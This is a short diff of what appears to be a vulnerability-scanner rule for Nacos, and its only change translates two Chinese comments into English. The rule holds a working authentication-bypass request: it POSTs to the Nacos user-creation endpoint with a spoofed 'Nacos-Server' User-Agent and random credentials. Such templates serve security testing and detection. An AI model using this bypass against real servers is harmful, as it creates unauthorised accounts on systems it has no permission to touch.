@@ -9,7 +9,7 @@ rules:
         request:
             cache: true
             method: POST
-            # 增加了 bypass 的方式
+            # Added a bypass method
             path: /nacos/v1/auth/users/?username={{r1}}&password={{r2}}
             headers:
                 User-Agent: Nacos-Server
@@ -29,7 +29,7 @@ rules:
             path: /nacos/v1/auth/users/?username={{r1}}
             headers:
                 User-Agent: Nacos-Server
-        # 不需要判断这个条件
+        # No need to check this condition
         expression: "true"
 expression: r0() && r1() && r2()
 detail:
